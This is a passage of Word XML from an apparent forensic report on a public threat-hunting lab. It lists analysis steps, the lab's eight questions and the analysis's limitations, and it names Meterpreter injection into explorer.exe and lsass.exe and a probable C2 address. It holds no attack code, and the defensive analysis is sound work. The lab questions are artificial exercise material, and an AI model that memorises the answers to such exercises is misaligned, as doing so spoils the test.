          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Step</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Status</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Tool calls</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Duration</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>System context and scope</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>64 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Triage of automatic detections</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>173 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Program execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>41</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>205 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Persistence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>79 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Accounts, authentication and privileges</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>86 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Remote access and lateral movement</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>97 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>User activity on files and folders</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>156 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Web browsing, downloads and e-mail</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>53 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Defense evasion and anti-forensics</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>143 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Collection, exfiltration and communications</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>66 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Incident timeline and correlation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>61 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Summary, answers and recommendations</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>133 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.4 Guidance provided by the analyst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Context</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Threat Hunting Lab 1 (github.com/medmondson44/Threat_Hunting_Labs): security has been alerted that this</w:t>
              <w:br/>
              <w:t>computer may have been compromised. The environment is "a little dirty" (lab setup activity).</w:t>
              <w:br/>
              <w:t>KAPE collection made on 2023-11-10 around 12:33 UTC. It was copied to the analysis VM on 2026-10-19:</w:t>
              <w:br/>
              <w:t>dates of 2026-10-19 are copy artefacts, not evidence.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period of interest</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>not specified</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Questions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Q1. What is the malicious executable?</w:t>
              <w:br/>
              <w:t>Q2. What process did the malicious executable migrate to?</w:t>
              <w:br/>
              <w:t>Q3. Were any situational awareness commands run? If so, what were they?</w:t>
              <w:br/>
              <w:t>Q4. Which IP and port is the malicious executable communicating with?</w:t>
              <w:br/>
              <w:t>Q5. Are there any other weird processes that can be associated with the malicious executable? If so, did they run?</w:t>
              <w:br/>
              <w:t>Q6. Give the chain of processes used by the malicious executable (mal.exe -&gt; migrated.exe -&gt; other exes), using ProcessGuid and ParentProcessGuid.</w:t>
              <w:br/>
              <w:t>Q7. What executable was the malicious executable masquerading as?</w:t>
              <w:br/>
              <w:t>Q8. What are the hashes of the malicious executable(s), for submission to VirusTotal by the analyst?</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Provided IOCs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Suspects</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Exclusions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Instructions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.5 Limitations of the analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Missing telemetry**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Sysmon telemetry starts at 10:51:10 UTC. The delivery phase (10:16–10:21), including the test.exe download, relies on Defender logs, WebCache, PowerShell logs and NTFS artefacts, with no process-creation events.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Sysmon configuration did not log network connections for pscp.exe or the injected explorer.exe, so the Meterpreter session socket (the C2 port) is not recorded. 10.0.0.12:8080 is the only port observed, so Q4 is probable, not confirmed.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No memory image was analysed. What was injected into explorer.exe and lsass.exe, any credential dumping and any in-memory-only modules cannot be verified.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No network or proxy logs were available.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Gaps in file evidence**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Hashes are only available for pscp.exe. test.exe, 1.exe and $RHOVDEL.exe were never hashed (no Amcache or Sysmon entry). They are presumed identical from their size only.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Parser issues**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Dissect job was partial and the SIDR database was dirty (warning status).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Attribution caveats**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The lab is described as "dirty". Some actions (the Defender exclusion and real-time protection disable through the UI, the elevated PowerShell launch) may be the lab operator staging the scenario rather than attacker tradecraft.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Analyst tooling (KAPE/gkape 11:21–12:31 UTC, Desktop\Tools) and the 2026-10-19 copy timestamps were excluded as noise.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 1 (System context and scope): No raw.native_wifi / native_panther tables available; Dissect job partial, SIDR warning; no Sysmon telemetry before 10:51:11 UTC; 4688 auditing not yet verified.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 2 (Triage of automatic detections): No Sysmon EID 3 for pscp.exe or explorer 7324: the Meterpreter C2 port is not yet established (pivot SRUM network usage, Sysmon 22, firewall/WFP logs in later steps). Hashes of test.exe/1.exe unavailable (no Amcache entries, no Sysmon 1); pscp.exe absent from Amcache. Purpose of the lsass remote thread is inferred. No offline hash set loaded (hash_hits empty).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
